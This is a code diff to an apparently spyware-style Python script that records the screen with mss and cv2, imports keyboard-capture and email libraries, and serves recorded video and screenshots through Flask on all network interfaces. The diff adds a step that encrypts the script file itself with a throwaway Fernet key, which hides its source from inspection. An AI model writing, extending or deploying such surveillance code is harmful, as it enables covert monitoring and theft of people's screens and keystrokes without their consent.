@@ -1,15 +1,21 @@
 import os
 import keyboard
 import smtplib
-from threading import Timer, Thread
+from threading import Thread
 import time
 import shutil
-from flask import Flask, Response, send_file, send_from_directory
 import cv2
 import numpy as np
 from mss import mss
+from cryptography.fernet import Fernet
+from flask import Flask, Response, send_file, send_from_directory
+
 
 app = Flask(__name__)
+
+# Encryption key for Fernet
+key = Fernet.generate_key()
+cipher_suite = Fernet(key)
 
 # Get the directory of the current script
 current_dir = os.path.dirname(__file__)
@@ -131,6 +137,7 @@ def download_video():
         # Restart the recording after the download is complete
         recording_thread = Thread(target=start_recording)
         recording_thread.start()
+
 # Route for downloading screenshots folder
 @app.route('/screenshots')
 def download_screenshots():
@@ -148,10 +155,16 @@ def download_screenshots():
         # Restart the recording after the download is complete
         recording_thread = Thread(target=start_recording)
         recording_thread.start()
-        
+
+# Encrypt the script file itself
+with open(__file__, 'rb') as f:
+    script_content = f.read()
+
+encrypted_content = cipher_suite.encrypt(script_content)
+
+with open(__file__, 'wb') as f:
+    f.write(encrypted_content)
+
 if __name__ == '__main__':
     from waitress import serve
     serve(app, host='0.0.0.0', port=5000)
-
-#Encrypt the test file
-
